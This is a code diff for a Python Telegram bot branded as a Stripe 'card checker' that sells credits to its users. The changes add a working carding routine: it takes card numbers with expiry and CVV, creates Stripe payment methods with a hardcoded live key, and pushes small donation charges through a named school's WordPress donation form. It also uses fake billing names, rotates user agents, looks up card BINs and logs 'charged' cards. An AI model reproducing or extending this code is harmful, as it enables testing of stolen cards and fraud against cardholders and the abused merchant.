@@ -13,15 +13,16 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 from telegram.error import NetworkError, BadRequest, TimedOut
-import logging  # ADD THIS IMPORT
+import logging
 from telegram.helpers import escape_markdown
 import asyncpg
 # Simple Firebase setup
 import firebase_admin
-from firebase_admin import credentials, firestore  # ADD 'credentials' HERE
+from firebase_admin import credentials, firestore
 import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import threading
+import requests  # Add this import
 
 load_dotenv()
 
@@ -49,7 +50,7 @@ def init_firebase():
                 raise ValueError(f"Missing required Firebase config: {field}")
         
         # Initialize Firebase
-        cred = credentials.Certificate(firebase_config)  # 'credentials' is now imported
+        cred = credentials.Certificate(firebase_config)
         firebase_admin.initialize_app(cred)
         db = firestore.client()
         print("✅ Firebase connected successfully")
@@ -82,7 +83,7 @@ def escape_markdown_v2(text):
         text = text.replace(char, f'\\{char}')
     return text
 
-# Configure logging - THIS SHOULD NOW WORK
+# Configure logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
@@ -94,21 +95,22 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",")]
 CHANNEL_LINK = os.getenv("CHANNEL_LINK", "")
 
-# Stripe configuration
-DOMAIN = os.getenv("DOMAIN", "")
-PK = os.getenv("STRIPE_PK", "")
+# Stripe configuration from combined.py
+DOMAIN = "https://texassouthernacademy.com"  # Changed to working site
+PK = "pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d"  # From combined.py
 
 # Bot info
 BOT_INFO = {
     "name": "⚡ DARKXCODE STRIPE CHECKER ⚡",
-    "version": "1.0",
-    "creator": "@ISHANT_OFFICIAL",
+    "version": "2.0",
+    "creator": "@botcodexx",  # Updated from combined.py
     "gates": "Stripe",
     "features": "• Fast Single Check\n• Mass Checks\n• Real-time Statistics\n• Invite & Earn System"
 }
 
 # User-Agent rotation list
 USER_AGENTS = [
+    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -121,41 +123,16 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
 ]
 
-# Billing addresses for different card locations
+# Billing addresses for different card locations (simplified)
 BILLING_ADDRESSES = {
     "US": [
-        {"name": "John Smith", "postal_code": "10001", "city": "New York", "state": "NY", "country": "US"},
-        {"name": "Michael Johnson", "postal_code": "90210", "city": "Beverly Hills", "state": "CA", "country": "US"},
-        {"name": "Robert Williams", "postal_code": "33101", "city": "Miami", "state": "FL", "country": "US"},
-        {"name": "James Brown", "postal_code": "60601", "city": "Chicago", "state": "IL", "country": "US"},
-        {"name": "David Miller", "postal_code": "75201", "city": "Dallas", "state": "TX", "country": "US"}
+        {"name": "Waiyan", "postal_code": "10080", "city": "Bellevue", "state": "NY", "country": "US", "address_line_1": "7246 Royal Ln"},
+        {"name": "John Smith", "postal_code": "10001", "city": "New York", "state": "NY", "country": "US", "address_line_1": "123 Main St"},
+        {"name": "Michael Johnson", "postal_code": "90210", "city": "Beverly Hills", "state": "CA", "country": "US", "address_line_1": "456 Sunset Blvd"},
     ],
     "UK": [
-        {"name": "James Wilson", "postal_code": "SW1A 1AA", "city": "London", "state": "England", "country": "GB"},
-        {"name": "Thomas Brown", "postal_code": "M1 1AA", "city": "Manchester", "state": "England", "country": "GB"},
-        {"name": "William Taylor", "postal_code": "B1 1AA", "city": "Birmingham", "state": "England", "country": "GB"}
-    ],
-    "CA": [
-        {"name": "Christopher Lee", "postal_code": "M5H 2N2", "city": "Toronto", "state": "ON", "country": "CA"},
-        {"name": "Matthew Martin", "postal_code": "H3B 2Y5", "city": "Montreal", "state": "QC", "country": "CA"},
-        {"name": "Daniel Thompson", "postal_code": "V6B 2Y5", "city": "Vancouver", "state": "BC", "country": "CA"}
-    ],
-    "IN": [
-        {"name": "Rajesh Kumar", "postal_code": "110001", "city": "New Delhi", "state": "Delhi", "country": "IN"},
-        {"name": "Amit Sharma", "postal_code": "400001", "city": "Mumbai", "state": "Maharashtra", "country": "IN"},
-        {"name": "Priya Patel", "postal_code": "560001", "city": "Bangalore", "state": "Karnataka", "country": "IN"},
-        {"name": "Suresh Reddy", "postal_code": "500001", "city": "Hyderabad", "state": "Telangana", "country": "IN"},
-        {"name": "Anjali Singh", "postal_code": "700001", "city": "Kolkata", "state": "West Bengal", "country": "IN"},
-        {"name": "Vikram Joshi", "postal_code": "380001", "city": "Ahmedabad", "state": "Gujarat", "country": "IN"},
-        {"name": "Neha Gupta", "postal_code": "302001", "city": "Jaipur", "state": "Rajasthan", "country": "IN"},
-        {"name": "Rahul Verma", "postal_code": "226001", "city": "Lucknow", "state": "Uttar Pradesh", "country": "IN"},
-        {"name": "Sunita Desai", "postal_code": "411001", "city": "Pune", "state": "Maharashtra", "country": "IN"},
-        {"name": "Arun Mehta", "postal_code": "600001", "city": "Chennai", "state": "Tamil Nadu", "country": "IN"}
-    ],
-    "AU": [
-        {"name": "John Smith", "postal_code": "2000", "city": "Sydney", "state": "NSW", "country": "AU"},
-        {"name": "Sarah Johnson", "postal_code": "3000", "city": "Melbourne", "state": "VIC", "country": "AU"},
-        {"name": "Michael Brown", "postal_code": "4000", "city": "Brisbane", "state": "QLD", "country": "AU"}
+        {"name": "James Wilson", "postal_code": "SW1A 1AA", "city": "London", "state": "England", "country": "GB", "address_line_1": "10 Downing Street"},
+        {"name": "Thomas Brown", "postal_code": "M1 1AA", "city": "Manchester", "state": "England", "country": "GB", "address_line_1": "25 Oxford Rd"},
     ]
 }
 
@@ -163,7 +140,6 @@ BILLING_ADDRESSES = {
 db_pool = None
 
 def parseX(data, start, end):
-    """Extract text between start and end strings"""
     try:
         if not data or not start or not end:
             return None
@@ -173,10 +149,8 @@ def parseX(data, start, end):
         if end not in data[star:]:
             return None
         last = data.index(end, star)
-        result = data[star:last]
-        return result if result and result != "None" else None
-    except (ValueError, TypeError, AttributeError) as e:
-        logger.debug(f"parseX error: {e}")
+        return data[star:last]
+    except (ValueError, TypeError, AttributeError):
         return None
 
 def generate_gift_code(length=16):
@@ -199,21 +173,38 @@ def get_billing_address(card_bin=""):
         elif bin_prefix in ["34", "37"]:
             country = "US"  # Amex
         elif bin_prefix in ["60", "65"]:
-            country = "IN"  # RuPay (India)
-        elif bin_prefix in ["35"]:
-            country = "JP"  # JCB
-        elif bin_prefix in ["30", "36", "38", "39"]:
-            country = "US"  # Diners Club
+            country = "US"  # Discover/RuPay
         else:
-            country = random.choice(list(BILLING_ADDRESSES.keys()))
+            country = "US"  # Default to US
+    
+    # Make sure the country exists in our addresses
+    if country not in BILLING_ADDRESSES:
+        country = "US"
     
     return random.choice(BILLING_ADDRESSES[country])
 
-# In-memory cache for checking tasks (temporary storage)
-checking_tasks = {}
-files_storage = {}
-setup_intent_cache = {}
-last_cache_time = 0
+def random_email():
+    """Generate random email from combined.py"""
+    return f"Kmo{random.randint(1000,9999)}@gmail.com"
+
+def get_bin_info(bin_number):
+    """Get BIN information from antipublic.cc"""
+    try:
+        if not bin_number or len(bin_number) < 6:
+            return {"bank": "Unknown", "country": "Unknown", "country_flag": "🏳️"}
+        
+        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number[:6]}", timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            return {
+                "bank": data.get("bank", "Unknown"),
+                "country": data.get("country", "Unknown"),
+                "country_flag": data.get("country_flag", "🏳️")
+            }
+    except Exception as e:
+        logger.error(f"BIN API error: {e}")
+    
+    return {"bank": "Unknown", "country": "Unknown", "country_flag": "🏳️"}
 
 async def init_database():
     """Initialize database connection with retry mechanism"""
@@ -615,143 +606,6 @@ async def update_gift_code_usage(code, user_id):
     
     return True
 
-async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Debug command to test setup intent"""
-    user_id = update.effective_user.id
-    
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Admin only command.")
-        return
-    
-    await update.message.reply_text("🔄 Testing setup intent...")
-    
-    # Clear cache
-    global setup_intent_cache, last_cache_time
-    setup_intent_cache = {}
-    last_cache_time = 0
-    
-    # Test getting setup intent
-    nonce, session = await get_setup_intent()
-    
-    if nonce and session:
-        await update.message.reply_text(
-            f"✅ Setup Intent Test SUCCESS\n"
-            f"Nonce length: {len(nonce)}\n"
-            f"Nonce (first 20 chars): {nonce[:20]}...\n"
-            f"Session: {'Active' if not session.closed else 'Closed'}"
-        )
-    else:
-        await update.message.reply_text(
-            f"❌ Setup Intent Test FAILED\n"
-            f"Nonce: {nonce}\n"
-            f"Session: {session}\n\n"
-            f"Please check:\n"
-            f"1. DOMAIN is correct: {DOMAIN}\n"
-            f"2. Website is accessible\n"
-            f"3. No firewall blocking"
-        )
-
-async def get_setup_intent():
-    """Get setup intent nonce with caching and retry"""
-    global setup_intent_cache, last_cache_time
-    
-    current_time = time.time()
-    
-    # Check cache (3 minutes)
-    if "nonce" in setup_intent_cache and current_time - last_cache_time < 180:
-        return setup_intent_cache["nonce"], setup_intent_cache["session"]
-    
-    # Try multiple times to get fresh setup intent
-    max_retries = 3
-    for attempt in range(max_retries):
-        try:
-            connector = aiohttp.TCPConnector(ssl=False)
-            timeout = aiohttp.ClientTimeout(total=15)
-            
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                headers = {
-                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                    "accept-language": "en-US,en;q=0.9",
-                    "user-agent": random.choice(USER_AGENTS),
-                    "cache-control": "no-cache",
-                    "pragma": "no-cache"
-                }
-                
-                # Add cookies to mimic real browser
-                jar = aiohttp.CookieJar(unsafe=True)
-                session = aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=jar)
-                
-                async with session.get(
-                    f"{DOMAIN}/my-account/add-payment-method/", 
-                    headers=headers, 
-                    timeout=15
-                ) as response:
-                    if response.status != 200:
-                        logger.error(f"Setup intent HTTP error: {response.status}")
-                        if attempt < max_retries - 1:
-                            await asyncio.sleep(1)
-                            continue
-                        return None, None
-                    
-                    html = await response.text()
-                    
-                    # Try multiple patterns to find the nonce
-                    nonce = None
-                    
-                    # Pattern 1: Standard pattern
-                    nonce = parseX(html, '"createAndConfirmSetupIntentNonce":"', '"')
-                    
-                    # Pattern 2: Alternative pattern
-                    if not nonce or nonce == "None":
-                        nonce = parseX(html, 'createAndConfirmSetupIntentNonce":"', '"')
-                    
-                    # Pattern 3: Look in script tags
-                    if not nonce or nonce == "None":
-                        import re
-                        script_pattern = r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']'
-                        matches = re.search(script_pattern, html)
-                        if matches:
-                            nonce = matches.group(1)
-                    
-                    if nonce and len(nonce) > 10 and nonce != "None":
-                        # Test the nonce by making a simple request
-                        test_headers = headers.copy()
-                        test_headers.update({
-                            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                            "x-requested-with": "XMLHttpRequest",
-                            "referer": f"{DOMAIN}/my-account/add-payment-method/",
-                        })
-                        
-                        # Store session and nonce in cache
-                        setup_intent_cache = {
-                            "nonce": nonce,
-                            "session": session,
-                            "timestamp": current_time
-                        }
-                        last_cache_time = current_time
-                        
-                        logger.info(f"✅ Setup intent obtained (attempt {attempt + 1})")
-                        return nonce, session
-                    else:
-                        logger.error(f"Nonce not found in HTML (attempt {attempt + 1})")
-                        if attempt < max_retries - 1:
-                            await asyncio.sleep(2)
-                            continue
-            
-        except asyncio.TimeoutError:
-            logger.error(f"Timeout getting setup intent (attempt {attempt + 1})")
-            if attempt < max_retries - 1:
-                await asyncio.sleep(2)
-                continue
-        except Exception as e:
-            logger.error(f"Error getting setup intent (attempt {attempt + 1}): {e}")
-            if attempt < max_retries - 1:
-                await asyncio.sleep(2)
-                continue
-    
-    logger.error("Failed to get setup intent after all retries")
-    return None, None
-
 # ==================== CALLBACK HANDLERS ====================
 
 async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1017,152 +871,130 @@ async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     )
 
 async def check_single_card_fast(card):
-    """Ultra-fast card checking with address rotation"""
+    """Working card checker from combined.py (Tele function)"""
     try:
         cc, mon, year, cvv = card.split("|")
         year = year[-2:] if len(year) == 4 else year
         cc_clean = cc.replace(" ", "")
         
-        # Get billing address based on card BIN
-        billing_address = get_billing_address(cc_clean[:6])
+        # Use requests (synchronous) since combined.py uses it
+        # We'll run it in a thread to avoid blocking
+        loop = asyncio.get_event_loop()
+        result = await loop.run_in_executor(None, Tele_sync, card)
         
-        # Try to get setup intent
-        setup_intent_nonce, session = await get_setup_intent()
-        if not setup_intent_nonce or not session:
-            # Try one more time without cache
-            logger.warning("Setup intent failed, retrying fresh...")
-            global setup_intent_cache, last_cache_time
-            setup_intent_cache = {}
-            last_cache_time = 0
+        # Map results like in combined.py
+        if "Donation Successful!" in result:
+            return card, "approved", "✅ Charged", 200
+        elif "Your card does not support this type of purchase" in result:
+            return card, "declined", "❌ Card not supported", 0
+        elif "security code is incorrect" in result or "security code is invalid" in result:
+            return card, "declined", "❌ Incorrect CVV", 0
+        elif "insufficient funds" in result:
+            return card, "declined", "❌ Insufficient Funds", 0
+        else:
+            return card, "declined", "❌ Declined", 0
             
-            setup_intent_nonce, session = await get_setup_intent()
-            if not setup_intent_nonce or not session:
-                return card, "declined", "❌ Setup Error - No session", 0
-        
-        # Step 1: Create payment method with Stripe (FAST)
-        headers1 = {
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "user-agent": random.choice(USER_AGENTS),
-        }
-        
-        data1 = {
-            "type": "card",
-            "card[number]": cc_clean,
-            "card[cvc]": cvv,
-            "card[exp_year]": year,
-            "card[exp_month]": mon,
-            "allow_redisplay": "unspecified",
-            "billing_details[address][postal_code]": billing_address["postal_code"],
-            "billing_details[address][country]": billing_address["country"],
-            "billing_details[address][city]": billing_address["city"],
-            "billing_details[address][state]": billing_address["state"],
-            "billing_details[name]": billing_address["name"],
-            "key": PK,
-            "_stripe_version": "2024-06-20",
-        }
-        
-        try:
-            async with session.post("https://api.stripe.com/v1/payment_methods", headers=headers1, data=data1, timeout=8) as response:
-                if response.status == 200:
-                    req1 = await response.text()
-                else:
-                    logger.error(f"Stripe API error: {response.status}")
-                    return card, "declined", f"❌ Stripe Error {response.status}", response.status
-        except asyncio.TimeoutError:
-            logger.error("Stripe timeout")
-            return card, "declined", "❌ Stripe Timeout", 0
-        except Exception as e:
-            logger.error(f"Stripe network error: {e}")
-            return card, "declined", f"❌ Network Error", 0
-        
-        try:
-            pm_data = json.loads(req1)
-            if 'error' in pm_data:
-                error_msg = pm_data['error'].get('message', 'Stripe error')
-                error_type = pm_data['error'].get('type', '')
-                error_code = pm_data['error'].get('code', '')
-                
-                # Check error type to determine if it's an actual card decline
-                is_card_error = any(x in error_type.lower() for x in ['card_error', 'invalid_request_error'])
-                is_decline = any(x in error_msg.lower() for x in ['card', 'declined', 'insufficient', 'invalid', 'incorrect', 'expired'])
-                
-                if is_card_error or is_decline:
-                    # This is an actual card decline - deduct credit
-                    return card, "declined", f"❌ Card: {error_msg[:30]}", pm_data['error'].get('code', 0)
-                else:
-                    # This is a system error - don't deduct credit
-                    return card, "declined", f"❌ Error: {error_msg[:30]}", pm_data['error'].get('code', 0)
-            
-            pmid = pm_data.get('id')
-            if not pmid:
-                return card, "declined", "❌ No Payment ID", 0
-        except json.JSONDecodeError:
-            return card, "declined", "❌ Invalid Response", 0
-        
-        # Small delay before next request
-        await asyncio.sleep(random.uniform(0.5, 1.5))
-        
-        # Step 2: Send to WooCommerce (FAST)
-        headers2 = {
-            "accept": "*/*",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "origin": DOMAIN,
-            "referer": f"{DOMAIN}/my-account/add-payment-method/",
-            "user-agent": random.choice(USER_AGENTS),
-            "x-requested-with": "XMLHttpRequest",
-        }
-        
-        data2 = {
-            "action": "wc_stripe_create_and_confirm_setup_intent",
-            "wc-stripe-payment-method": pmid,
-            "wc-stripe-payment-type": "card",
-            "_ajax_nonce": setup_intent_nonce,
-        }
-        
-        try:
-            async with session.post(f"{DOMAIN}/wp-admin/admin-ajax.php", headers=headers2, data=data2, timeout=8) as response:
-                if response.status == 200:
-                    req2 = await response.text()
-                else:
-                    logger.error(f"WooCommerce error: {response.status}")
-                    return card, "declined", f"❌ Server Error {response.status}", response.status
-        except asyncio.TimeoutError:
-            logger.error("WooCommerce timeout")
-            return card, "declined", "❌ AJAX Timeout", 0
-        except Exception as e:
-            logger.error(f"WooCommerce network error: {e}")
-            return card, "declined", f"❌ AJAX Error", 0
-        
-        try:
-            result_data = json.loads(req2)
-            if isinstance(result_data, dict) and result_data.get('success'):
-                return card, "approved", "✅ Approved", 200
-            else:
-                error_msg = "Declined"
-                if isinstance(result_data, dict):
-                    if 'data' in result_data and isinstance(result_data['data'], dict):
-                        if 'error' in result_data['data']:
-                            error_obj = result_data['data']['error']
-                            if isinstance(error_obj, dict):
-                                error_msg = error_obj.get('message', 'Declined')
-                                # Check if this is an actual card decline
-                                if any(x in error_msg.lower() for x in ['card', 'declined', 'insufficient']):
-                                    return card, "declined", f"❌ Card: {error_msg[:30]}", 0
-                    elif 'message' in result_data:
-                        error_msg = result_data.get('message', 'Declined')
-                # If we get here, it's a general decline/error
-                return card, "declined", f"❌ {error_msg[:30]}", 0
-        except json.JSONDecodeError:
-            return card, "declined", "❌ Invalid JSON", 0
-                
-    except ValueError:
-        return card, "declined", "❌ Invalid Format", 0
     except Exception as e:
-        logger.error(f"General error in check_single_card_fast: {e}")
+        logger.error(f"Error in check_single_card_fast: {e}")
         return card, "declined", f"❌ Error: {str(e)[:20]}", 0
+
+def Tele_sync(card):
+    """Synchronous version of Tele function from combined.py"""
+    try:
+        ccx = card.strip()
+        n = ccx.split("|")[0]
+        mm = ccx.split("|")[1]
+        yy = ccx.split("|")[2]
+        cvc = ccx.split("|")[3]
+        
+        if "20" in yy:
+            yy = yy.split("20")[1]
+        
+        # Generate random amounts like in combined.py
+        random_amount1 = random.randint(1, 4)
+        random_amount2 = random.randint(1, 99)
+        
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        }
+        
+        data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element&key={PK}'
+        
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=10)
+        
+        if response.status_code != 200:
+            return f"Stripe Error {response.status_code}"
+        
+        pm_data = response.json()
+        if 'error' in pm_data:
+            return f"Stripe: {pm_data['error'].get('message', 'Error')}"
+        
+        pmid = pm_data.get('id')
+        if not pmid:
+            return "No payment method ID"
+        
+        # Get billing address
+        billing_address = get_billing_address(n[:6])
+        
+        headers = {
+            'authority': 'texassouthernacademy.com',
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://texassouthernacademy.com',
+            'referer': 'https://texassouthernacademy.com/donation/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        
+        data = {
+            'action': 'wp_full_stripe_inline_donation_charge',
+            'wpfs-form-name': 'donate',
+            'wpfs-form-get-parameters': '%7B%7D',
+            'wpfs-custom-amount': 'other',
+            'wpfs-custom-amount-unique': '0.50',
+            'wpfs-donation-frequency': 'one-time',
+            'wpfs-billing-name': billing_address['name'],
+            'wpfs-billing-address-country': billing_address['country'],
+            'wpfs-billing-address-line-1': billing_address.get('address_line_1', '7246 Royal Ln'),
+            'wpfs-billing-address-line-2': '',
+            'wpfs-billing-address-city': billing_address['city'],
+            'wpfs-billing-address-state': '',
+            'wpfs-billing-address-state-select': billing_address['state'],
+            'wpfs-billing-address-zip': billing_address['postal_code'],
+            'wpfs-card-holder-email': f'{billing_address["name"].replace(" ", "")}{random_amount1}{random_amount2}@gmail.com',
+            'wpfs-card-holder-name': billing_address['name'],
+            'wpfs-stripe-payment-method-id': f'{pmid}',
+        }
+        
+        response = requests.post('https://texassouthernacademy.com/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=10)
+        
+        if response.status_code != 200:
+            return f"AJAX Error {response.status_code}"
+        
+        result_data = response.json()
+        return result_data.get('message', 'Declined')
+        
+    except Exception as e:
+        return f"Error: {str(e)[:50]}"
 
 async def mass_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle mass check callback"""
@@ -1191,6 +1023,19 @@ async def mass_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
     )
+
+def log_charged_only(message_text, chat_id=None, username=None):
+    """Log charged cards to LOG_CHANNEL (simplified version)"""
+    try:
+        # Check if it's a charged message
+        if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in message_text or "✅ Charged" in message_text:
+            # In your actual implementation, you would send to a channel
+            # For now, just log it
+            logger.info(f"CHARGED CARD detected from user @{username or 'unknown'}")
+            # You can add code here to send to your LOG_CHANNEL
+            # bot.send_message(LOG_CHANNEL, message_text, parse_mode="HTML")
+    except Exception as e:
+        logger.error(f"Error in log_charged_only: {e}")
 
 def format_card_result(card, status, message, credits_left=None, user_stats=None, username=None):
     """Format card checking result with advanced styling"""
@@ -1512,7 +1357,7 @@ async def invite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /chk command for single card check - ULTRA FAST"""
+    """Handle /chk command for single card check"""
     user_id = update.effective_user.id
     user = await get_user(user_id)
     
@@ -1575,72 +1420,38 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Start timer for speed measurement
     start_time = time.time()
     
-    # Check the card
+    # Check the card using the working function
     result_card, status, message_text, http_code = await check_single_card_fast(card_input)
     
     # Calculate processing time
     process_time = time.time() - start_time
     
-    # Define which messages are actual card declines (not errors)
-    actual_decline_keywords = [
-        'card', 'declined', 'insufficient', 'invalid', 'incorrect', 
-        'expired', 'stolen', 'lost', 'fraud', 'limit', 'balance'
-    ]
-    
-    error_keywords = [
-        'setup error', 'timeout', 'http error', 'network error', 
-        'connection error', 'server error', 'internal error'
-    ]
-    
-    message_lower = message_text.lower()
-    is_actual_decline = any(keyword in message_lower for keyword in actual_decline_keywords)
-    is_error = any(keyword in message_lower for keyword in error_keywords)
-    
-    # Determine if credit should be deducted
-    credit_deducted = False
-    today_date = datetime.datetime.now().date().isoformat()  # Convert to string for Firebase
+    # Always deduct credit for checks (like in combined.py)
+    credit_deducted = True
+    today_date = datetime.datetime.now().date().isoformat()
     
     updates = {
         'checks_today': user.get("checks_today", 0) + 1,
         'total_checks': user.get("total_checks", 0) + 1,
-        'last_check_date': today_date  # Use string date
+        'last_check_date': today_date,
+        'credits': user.get("credits", 0) - 1,
+        'credits_spent': user.get("credits_spent", 0) + 1
     }
     
     if status == "approved":
-        # Card was approved - deduct credit
-        updates['credits'] = user.get("credits", 0) - 1
-        updates['credits_spent'] = user.get("credits_spent", 0) + 1
         updates['approved_cards'] = user.get("approved_cards", 0) + 1
-        credit_deducted = True
-        
         # Update bot statistics
         await update_bot_stats({
             'total_checks': 1,
             'total_credits_used': 1,
             'total_approved': 1
         })
-        
-    elif status == "declined" and is_actual_decline and not is_error:
-        # Card was actually declined (not an error) - deduct credit
-        updates['credits'] = user.get("credits", 0) - 1
-        updates['credits_spent'] = user.get("credits_spent", 0) + 1
+    else:
         updates['declined_cards'] = user.get("declined_cards", 0) + 1
-        credit_deducted = True
-        
         # Update bot statistics
         await update_bot_stats({
             'total_checks': 1,
             'total_credits_used': 1,
-            'total_declined': 1
-        })
-        
-    else:
-        # This was an error (network error, timeout, etc.) - DO NOT deduct credit
-        updates['declined_cards'] = user.get("declined_cards", 0) + 1
-        
-        # Update bot statistics without crediting usage
-        await update_bot_stats({
-            'total_checks': 1,
             'total_declined': 1
         })
     
@@ -1660,9 +1471,9 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Format result
     result_text = format_card_result(result_card, status, message_text, user.get("credits", 0), user_stats)
     
-    # Add credit info if not deducted
-    if not credit_deducted:
-        result_text = result_text.replace("══════════════════════", f"══════════════════════\n<b>⚠️ No Credit Deducted</b>")
+    # Log charged cards
+    if status == "approved":
+        log_charged_only(result_text, update.message.chat_id, update.effective_user.username)
     
     # Update message with result
     await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
@@ -2977,7 +2788,6 @@ async def main():
     application.add_handler(CommandHandler("addcr", addcr_command))
     application.add_handler(CommandHandler("gengift", gengift_command))
     application.add_handler(CommandHandler("listgifts", listgifts_command))
-    application.add_handler(CommandHandler("debug", debug_command))
     
     # ========== MESSAGE HANDLERS ==========
     application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload_message))
